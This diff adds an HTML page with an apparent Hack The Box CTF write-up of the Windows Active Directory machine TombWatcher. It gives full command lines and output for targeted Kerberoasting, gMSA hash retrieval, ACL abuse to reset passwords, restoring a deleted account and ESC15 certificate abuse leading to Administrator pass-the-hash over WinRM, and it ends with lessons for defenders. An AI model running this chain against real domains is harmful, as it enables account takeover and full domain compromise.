@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="TombWatcher CTF writeup by Vikram Singh." />
+  <title>TombWatcher | CTF Writeup</title>
+  <link rel="stylesheet" href="../../assets/css/styles.css" />
+</head>
+<body>
+  <canvas id="matrixCanvas" aria-hidden="true"></canvas>
+  <div class="noise" aria-hidden="true"></div>
+  <div class="orb one" aria-hidden="true"></div>
+  <div class="orb two" aria-hidden="true"></div>
+
+  <header class="site-header">
+    <nav class="nav-shell" aria-label="Primary navigation">
+      <button class="mobile-toggle" id="mobileToggle" type="button" aria-label="Toggle navigation">menu</button>
+      <div class="nav-links" id="navLinks">
+        <a class="nav-link" href="../../index.html#about">About</a>
+        <a class="nav-link active" href="../../index.html#writeups">CTF Writeups</a>
+        <a class="nav-link external-link" href="https://github.com/Vikram-Singh-Gill" target="_blank" rel="noopener">GitHub</a>
+        <a class="nav-link external-link" href="https://linkedin.com/in/vikram-singh-gill/" target="_blank" rel="noopener">LinkedIn</a>
+        <a class="nav-link external-link" href="https://profile.hackthebox.com/profile/019db6a4-2dd8-7208-b304-27d9979fbb0a" target="_blank" rel="noopener">HTB Profile</a>
+      </div>
+    </nav>
+  </header>
+
+  <main>
+    <section class="container writeup-layout">
+      <article class="article">
+        <div class="eyebrow"><span class="status-dot"></span> CTF writeup</div>
+        <h1>HTB TombWatcher</h1>
+
+        <h2 id="info">Machine / Target Info</h2>
+        <table class="info-table">
+          <tr><th>Difficulty</th><td>Medium</td></tr>
+          <tr><th>OS</th><td>Windows / Active Directory</td></tr>
+          <tr><th>Focus</th><td>BloodHound, targeted Kerberoasting, gMSA password retrieval, AD object ACL abuse, AD Recycle Bin, AD CS ESC15</td></tr>
+        </table>
+
+        <h2 id="summary">Summary</h2>
+        <p>
+          TombWatcher starts as an assumed-breach Windows Active Directory machine. The provided user
+          <code>henry</code> has <code>WriteSPN</code> over <code>alfred</code>, which makes it possible to perform a
+          targeted Kerberoast attack. After cracking <code>alfred</code>'s ticket, I used the new account to continue
+          following the BloodHound path through group membership, gMSA access, password resets, and object ownership abuse.
+        </p>
+        <p>
+          The main attack chain was: <code>henry</code> to <code>alfred</code>, <code>alfred</code> to the
+          <code>Infrastructure</code> group, <code>Infrastructure</code> to the <code>ansible_dev$</code> gMSA account,
+          <code>ansible_dev$</code> to <code>sam</code>, <code>sam</code> to <code>john</code>, and then <code>john</code>
+          to the <code>ADCS</code> OU. From there, I restored the deleted <code>cert_admin</code> account, reset its password,
+          abused the vulnerable <code>WebServer</code> template through <code>ESC15</code>, requested a certificate for
+          <code>Administrator</code>, and used it to get administrative access over WinRM.
+        </p>
+
+        <h2 id="enumeration">Enumeration</h2>
+        <p>
+          I started with a full TCP port scan to identify exposed services on the target. The scan showed DNS,
+          Kerberos, LDAP, SMB, WinRM, AD Web Services, and multiple RPC ports, which strongly indicated that the
+          host was a Domain Controller.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ nmap -sC -sV -p- 10.129.232.167
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 14:16 -0400
+Nmap scan report for 10.129.232.167
+Host is up (0.025s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc
+49695/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49696/tcp open  msrpc
+49698/tcp open  msrpc
+49715/tcp open  msrpc
+49718/tcp open  msrpc
+Service Info: Host: DC01; OS: Windows</code></pre>
+
+        <p>
+          I added the domain and domain controller hostname to <code>/etc/hosts</code> so LDAP, Kerberos, BloodHound,
+          and Certipy could resolve the target properly.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ echo "10.129.232.167 tombwatcher.htb dc01.tombwatcher.htb" | sudo tee -a /etc/hosts</code></pre>
+
+        <h3 id="smb-enumeration">SMB Enumeration</h3>
+        <p>
+          The box provides the starting credentials <code>henry / H3nry_987TGV!</code>. I first validated the
+          credentials and listed the available SMB shares with NetExec.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ nxc smb 10.129.232.167 -u 'henry' -p 'H3nry_987TGV!' --shares
+
+SMB  10.129.232.167  445  DC01  [+] tombwatcher.htb\henry:H3nry_987TGV!
+SMB  10.129.232.167  445  DC01  [*] Enumerated shares
+
+Share      Permissions     Remark
+-----      -----------     ------
+ADMIN$                     Remote Admin
+C$                         Default share
+IPC$       READ            Remote IPC
+NETLOGON   READ            Logon server share
+SYSVOL     READ            Logon server share</code></pre>
+
+        <h3 id="bloodhound-initial">Initial BloodHound Collection</h3>
+        <p>
+          With valid domain credentials, I collected BloodHound data to look for outbound rights from the
+          <code>henry</code> user.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ sudo bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -ns 10.129.232.167 -d tombwatcher.htb -c all
+
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: tombwatcher.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.tombwatcher.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Found 9 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Done in 00M 04S</code></pre>
+
+        <p>
+          After marking <code>henry</code> as owned in BloodHound, the first useful edge was
+          <code>WriteSPN</code> over <code>alfred</code>. This is useful because an attacker can add an SPN to the target
+          account and request a Kerberos service ticket encrypted with that user's password hash.
+        </p>
+
+        <figure class="writeup-figure" style="margin: 24px 0;">
+          <img src="bloodhound1.png" alt="BloodHound graph showing henry has WriteSPN over alfred" style="display: block; width: 100%; max-width: 100%; border: 1px solid rgba(148, 163, 184, 0.28); border-radius: 16px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);" />
+
+        </figure>
+
+        <h2 id="foothold">Foothold</h2>
+        <h3 id="targeted-kerberoast">Targeted Kerberoast: henry to alfred</h3>
+        <p>
+          I used <code>targetedKerberoast</code> with the <code>henry</code> credentials. The tool adds an SPN to the
+          target account, requests a TGS, prints the Kerberoast hash, and then the hash can be cracked offline.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ targetedKerberoast -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
+
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (Alfred)
+[+] Printing hash for (Alfred)
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$&lt;hash-redacted&gt;</code></pre>
+
+        <p>
+          I saved the Kerberoast hash to a file and cracked it with Hashcat mode <code>13100</code>.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$&lt;hash-redacted&gt;:basketball</code></pre>
+
+        <p>
+          This gave me the next valid domain credential:
+        </p>
+
+<pre><code>alfred : basketball</code></pre>
+
+        <p>
+          I confirmed that the new credentials worked against SMB.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ nxc smb 10.129.232.167 -u alfred -p 'basketball'
+
+SMB  10.129.232.167  445  DC01  [+] tombwatcher.htb\alfred:basketball</code></pre>
+
+        <h2 id="lateral-movement">Lateral Movement</h2>
+        <h3 id="infrastructure-group">AddSelf: alfred to Infrastructure</h3>
+        <p>
+          After marking <code>alfred</code> as owned in BloodHound, the next useful edge was <code>AddSelf</code> over
+          the <code>Infrastructure</code> group. This means <code>alfred</code> can add itself to that group.
+        </p>
+
+        <figure class="writeup-figure" style="margin: 24px 0;">
+          <img src="bloodhound2.png" alt="BloodHound graph showing alfred has AddSelf over the Infrastructure group" style="display: block; width: 100%; max-width: 100%; border: 1px solid rgba(148, 163, 184, 0.28); border-radius: 16px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);" />
+        
+        </figure>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ bloodyad --host "10.129.232.167" -d "tombwatcher.htb" -u "alfred" -p "basketball" add groupMember "Infrastructure" "alfred"
+
+[+] alfred added to Infrastructure</code></pre>
+
+        <p>
+          I also verified the group membership using <code>net rpc</code>.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ net rpc group members "Infrastructure" -U tombwatcher.htb/alfred%'basketball' -S 10.129.232.167
+
+TOMBWATCHER\Alfred</code></pre>
+
+        <h3 id="gmsa-password">ReadGMSAPassword: Infrastructure to ansible_dev$</h3>
+        <p>
+          BloodHound showed that the <code>Infrastructure</code> group can read the gMSA password for
+          <code>ansible_dev$</code>. A gMSA password is managed by Active Directory and stored in the
+          <code>msDS-ManagedPassword</code> attribute, but only approved principals can read it.
+        </p>
+
+        <figure class="writeup-figure" style="margin: 24px 0;">
+          <img src="bloodhound3.png" alt="BloodHound graph showing Infrastructure can read the gMSA password for ansible_dev" style="display: block; width: 100%; max-width: 100%; border: 1px solid rgba(148, 163, 184, 0.28); border-radius: 16px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);" />
+    
+        </figure>
+
+        <p>
+          I used NetExec's <code>--gmsa</code> option to retrieve the NTLM hash for <code>ansible_dev$</code>.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ nxc ldap 10.129.232.167 -u alfred -p 'basketball' --gmsa
+
+LDAP  10.129.232.167  389  DC01  [+] tombwatcher.htb\alfred:basketball
+LDAP  10.129.232.167  389  DC01  [*] Getting GMSA Passwords
+LDAP  10.129.232.167  389  DC01  Account: ansible_dev$  NTLM: cba56cd2df7d642f622e2a59956f6d47  PrincipalsAllowedToReadPassword: Infrastructure</code></pre>
+
+        <p>
+          I then verified that the <code>ansible_dev$</code> hash worked.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ nxc smb 10.129.232.167 -u 'ansible_dev$' -H 'cba56cd2df7d642f622e2a59956f6d47'
+
+SMB  10.129.232.167  445  DC01  [+] tombwatcher.htb\ansible_dev$:cba56cd2df7d642f622e2a59956f6d47</code></pre>
+
+        <h3 id="sam-password-reset">ForceChangePassword: ansible_dev$ to sam</h3>
+        <p>
+          The next BloodHound edge showed that <code>ansible_dev$</code> has <code>ForceChangePassword</code> over
+          <code>sam</code>. This allows us to reset <code>sam</code>'s password without knowing the old password.
+        </p>
+
+        <figure class="writeup-figure" style="margin: 24px 0;">
+          <img src="bloodhound4.png" alt="BloodHound graph showing ansible_dev has ForceChangePassword over sam" style="display: block; width: 100%; max-width: 100%; border: 1px solid rgba(148, 163, 184, 0.28); border-radius: 16px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);" />
+      
+        </figure>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ bloodyad --host "10.129.232.167" -d "tombwatcher.htb" -u "ansible_dev$" -p ":cba56cd2df7d642f622e2a59956f6d47" set password "sam" "password123"
+
+[+] Password changed successfully!</code></pre>
+
+        <p>
+          I verified the new <code>sam</code> credentials with SMB.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ nxc smb 10.129.232.167 -u sam -p 'password123'
+
+SMB  10.129.232.167  445  DC01  [+] tombwatcher.htb\sam:password123</code></pre>
+
+        <h3 id="john-takeover">WriteOwner: sam to john</h3>
+        <p>
+          BloodHound showed that <code>sam</code> has <code>WriteOwner</code> over <code>john</code>. With <code>WriteOwner</code>,
+          I could change the owner of the <code>john</code> object to <code>sam</code>. After becoming the owner, I could
+          grant <code>sam</code> <code>GenericAll</code> over <code>john</code> and reset <code>john</code>'s password.
+        </p>
+
+        <figure class="writeup-figure" style="margin: 24px 0;">
+          <img src="bloodhound5.png" alt="BloodHound graph showing sam has WriteOwner over john" style="display: block; width: 100%; max-width: 100%; border: 1px solid rgba(148, 163, 184, 0.28); border-radius: 16px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);" />
+      
+        </figure>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ bloodyad --host "10.129.232.167" -d "tombwatcher.htb" -u "sam" -p "password123" set owner john sam
+
+[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
+
+┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ bloodyad --host "10.129.232.167" -d "tombwatcher.htb" -u "sam" -p "password123" add genericAll john sam
+
+[+] sam has now GenericAll on john
+
+┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ bloodyad --host "10.129.232.167" -d "tombwatcher.htb" -u "sam" -p "password123" set password john 'password123'
+
+[+] Password changed successfully!</code></pre>
+
+        <p>
+          I verified that <code>john</code> worked and confirmed WinRM access.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ nxc smb 10.129.232.167 -u john -p 'password123'
+SMB  10.129.232.167  445  DC01  [+] tombwatcher.htb\john:password123
+
+┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ nxc winrm 10.129.232.167 -u john -p 'password123'
+WINRM  10.129.232.167  5985  DC01  [+] tombwatcher.htb\john:password123 (Pwn3d!)</code></pre>
+
+        <h3 id="winrm-user">WinRM as john</h3>
+        <p>
+          Since <code>john</code> is allowed to use WinRM, I used Evil-WinRM to get an interactive shell. The user
+          flag was located in <code>C:\Users\john\Desktop\user.txt</code>.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ evil-winrm -i 10.129.232.167 -u john -p 'password123'
+
+Evil-WinRM shell v3.9
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\john\Documents&gt; whoami
+tombwatcher\john
+
+*Evil-WinRM* PS C:\Users\john\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\john\Desktop&gt; dir
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/29/2026   6:14 PM             34 user.txt
+
+*Evil-WinRM* PS C:\Users\john\Desktop&gt; type user.txt
+&lt;user-flag-redacted&gt;</code></pre>
+
+        <h2 id="privilege-escalation">Privilege Escalation</h2>
+        <h3 id="adcs-ou">GenericAll: john to ADCS OU</h3>
+        <p>
+          Back in BloodHound, <code>john</code> had <code>GenericAll</code> over the <code>ADCS</code> organizational unit.
+          At first, the OU did not directly contain anything useful, but it became important after identifying a
+          deleted certificate-related account that originally belonged to this OU.
+        </p>
+
+        <figure class="writeup-figure" style="margin: 24px 0;">
+          <img src="bloodhound6.png" alt="BloodHound graph showing john has GenericAll over the ADCS OU" style="display: block; width: 100%; max-width: 100%; border: 1px solid rgba(148, 163, 184, 0.28); border-radius: 16px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);" />
+      
+        </figure>
+
+        <h3 id="adcs-enumeration">AD CS Enumeration</h3>
+        <p>
+          I enumerated AD CS as <code>john</code>. The important clue was inside the <code>WebServer</code> template:
+          Certipy showed an unresolved SID in the enrollment permissions. A SID that does not resolve to a normal
+          username can indicate a deleted object that still has permissions on the template.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad find -u 'john' -p 'password123' -dc-ip 10.129.232.167 -enabled -stdout
+
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
+
+Certificate Authorities
+  0
+    CA Name                         : tombwatcher-CA-1
+    DNS Name                        : DC01.tombwatcher.htb
+    Web Enrollment                  : Disabled
+    Request Disposition             : Issue
+    Enforce Encryption for Requests : Enabled</code></pre>
+
+        <h3 id="deleted-object">Finding the Deleted cert_admin Account</h3>
+        <p>
+          From the WinRM shell, I searched the deleted objects container for the unresolved SID. The result showed
+          a deleted user named <code>cert_admin</code> with the object GUID
+          <code>938182c3-bf0b-410a-9aaa-45c8e1a02ebf</code>. The key attribute was <code>LastKnownParent</code>, which
+          pointed back to <code>OU=ADCS,DC=tombwatcher,DC=htb</code>.
+        </p>
+
+<pre><code>*Evil-WinRM* PS C:\Users\john\Documents&gt; Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties * -IncludeDeletedObjects
+
+CanonicalName       : tombwatcher.htb/Deleted Objects/cert_admin
+                      DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+CN                  : cert_admin
+                      DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+Deleted             : True
+DistinguishedName   : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
+isDeleted           : True
+LastKnownParent     : OU=ADCS,DC=tombwatcher,DC=htb
+ObjectClass         : user
+ObjectGUID          : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+objectSid           : S-1-5-21-1392491010-1358638721-2126982587-1111
+sAMAccountName      : cert_admin</code></pre>
+
+        <p>
+          Since <code>john</code> controlled the <code>ADCS</code> OU, restoring <code>cert_admin</code> back into that OU made
+          it possible to control the restored account and reset its password.
+        </p>
+
+<pre><code>*Evil-WinRM* PS C:\Users\john\Documents&gt; Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"</code></pre>
+
+        <p>
+          After restoring the object, I made sure <code>john</code> had full control over the <code>ADCS</code> OU path and
+          then reset <code>cert_admin</code>'s password.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ bloodyad --host "10.129.232.167" -d "tombwatcher.htb" -u "john" -p "password123" add genericAll "OU=ADCS,DC=TOMBWATCHER,DC=HTB" john
+
+[+] john has now GenericAll on OU=ADCS,DC=TOMBWATCHER,DC=HTB
+
+┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ bloodyad --host "10.129.232.167" -d "tombwatcher.htb" -u "john" -p "password123" set password "cert_admin" "password123"
+
+[+] Password changed successfully!</code></pre>
+
+        <h3 id="esc15">ESC15 Abuse</h3>
+        <p>
+          I then ran Certipy again as <code>cert_admin</code>. This time, the vulnerable <code>WebServer</code> template was
+          usable because <code>cert_admin</code> had enrollment rights. The template was vulnerable to <code>ESC15</code>:
+          it was schema version 1 and allowed the enrollee to supply the subject. This allowed me to request a
+          certificate with the Certificate Request Agent application policy.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad find -u "cert_admin" -p "password123" -dc-ip 10.129.232.167 -vulnerable -enabled -stdout
+
+Template Name                       : WebServer
+Display Name                        : Web Server
+Certificate Authorities             : tombwatcher-CA-1
+Enabled                             : True
+Enrollee Supplies Subject           : True
+Schema Version                      : 1
+Enrollment Rights                   : TOMBWATCHER.HTB\cert_admin
+[!] Vulnerabilities
+  ESC15                             : Enrollee supplies subject and schema version is 1.</code></pre>
+
+        <p>
+          First, I requested a certificate as <code>cert_admin</code> with the Certificate Request Agent application policy
+          OID <code>1.3.6.1.4.1.311.20.2.1</code>.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad req -ca tombwatcher-CA-1 -username cert_admin -p 'password123' -dc-ip 10.129.232.167 -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip 10.129.232.167
+
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+[*] Requesting certificate via RPC
+[*] Request ID is 4
+[*] Successfully requested certificate
+[*] Got certificate without identity
+[*] Certificate has no object SID
+[*] Saving certificate and private key to 'cert_admin.pfx'
+[*] Wrote certificate and private key to 'cert_admin.pfx'</code></pre>
+
+        <p>
+          Then I used that certificate to request a certificate on behalf of the domain <code>Administrator</code>.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad req -u 'cert_admin' -p 'password123' -dc-ip 10.129.232.167 -target-ip 10.129.232.167 -ca tombwatcher-CA-1 -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx
+
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+[*] Requesting certificate via RPC
+[*] Request ID is 6
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@tombwatcher.htb'
+[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'</code></pre>
+
+        <h3 id="administrator-auth">Authenticating as Administrator</h3>
+        <p>
+          Finally, I authenticated with <code>administrator.pfx</code> and retrieved the Administrator NT hash.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad auth -dc-ip 10.129.232.167 -pfx administrator.pfx
+
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@tombwatcher.htb'
+[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
+[*] Using principal: 'administrator@tombwatcher.htb'
+[*] Trying to get TGT
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:&lt;administrator-nt-hash&gt;</code></pre>
+
+        <p>
+          When using Evil-WinRM with a hash, I used only the NT portion of the hash with <code>-H</code>.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ evil-winrm -i 10.129.232.167 -u 'administrator' -H '&lt;administrator-nt-hash&gt;'
+
+Evil-WinRM shell v3.9
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/29/2026   6:14 PM             34 root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+&lt;root-flag-redacted&gt;</code></pre>
+
+        <h2 id="lessons">Lessons Learned</h2>
+        <p>
+          TombWatcher was a strong example of how Active Directory compromise often comes from chaining several
+          small permissions together rather than finding one obvious vulnerability. The initial <code>henry</code>
+          account did not provide shell access, but each BloodHound edge revealed another controlled step toward
+          domain compromise.
+        </p>
+
+        <ul>
+          <li>
+            <strong><code>WriteSPN</code> can turn into credentials.</strong>
+            Even without knowing <code>alfred</code>'s password, <code>henry</code>'s ability to write an SPN allowed a targeted
+            Kerberoast attack and offline password cracking.
+          </li>
+          <li>
+            <strong>Group membership edges matter.</strong>
+            <code>AddSelf</code> over the <code>Infrastructure</code> group looked simple, but it unlocked access to the
+            <code>ansible_dev$</code> gMSA password.
+          </li>
+          <li>
+            <strong>gMSA read permissions are high-impact.</strong>
+            Reading <code>msDS-ManagedPassword</code> gave a usable NTLM hash for <code>ansible_dev$</code>, which became the
+            next pivot in the chain.
+          </li>
+          <li>
+            <strong>Password reset rights are direct privilege escalation paths.</strong>
+            <code>ForceChangePassword</code> over <code>sam</code> allowed a password reset without knowing the old password.
+          </li>
+          <li>
+            <strong><code>WriteOwner</code> is dangerous because ownership leads to control.</strong>
+            By taking ownership of <code>john</code>, I could grant <code>GenericAll</code> and reset the account password.
+          </li>
+          <li>
+            <strong>Deleted AD objects can still matter.</strong>
+            The unresolved SID in the certificate template led to a deleted <code>cert_admin</code> account. Restoring it
+            through the AD Recycle Bin turned a stale permission into a working privilege escalation path.
+          </li>
+          <li>
+            <strong>AD CS templates should be reviewed carefully.</strong>
+            The vulnerable <code>WebServer</code> template exposed an <code>ESC15</code> path, allowing a certificate request chain
+            that ended with Administrator authentication.
+          </li>
+        </ul>
+
+        <p>
+          The main takeaway is that defenders should not review ACLs, gMSA permissions, deleted objects, and AD CS
+          templates in isolation. TombWatcher showed that each one may look limited by itself, but together they can
+          create a full path from a low-privileged user to Domain Admin.
+        </p>
+      </article>
+
+      <aside class="toc" aria-label="Table of contents">
+        <h3>TombWatcher</h3>
+        <a href="../../index.html#writeups">Back to CTF Writeups</a>
+        <a href="#info">Machine / Target Info</a>
+        <a href="#summary">Summary</a>
+        <a href="#enumeration">Enumeration</a>
+        <a href="#foothold">Foothold</a>
+        <a href="#lateral-movement">Lateral Movement</a>
+        <a href="#privilege-escalation">Privilege Escalation</a>
+        <a href="#lessons">Lessons Learned</a>
+      </aside>
+    </section>
+  </main>
+
+  <footer>
+    <span>© <span id="year"></span> Vikram Singh</span>
+  </footer>
+
+  <script src="../../assets/js/writeup.js"></script>
+</body>
+</html>
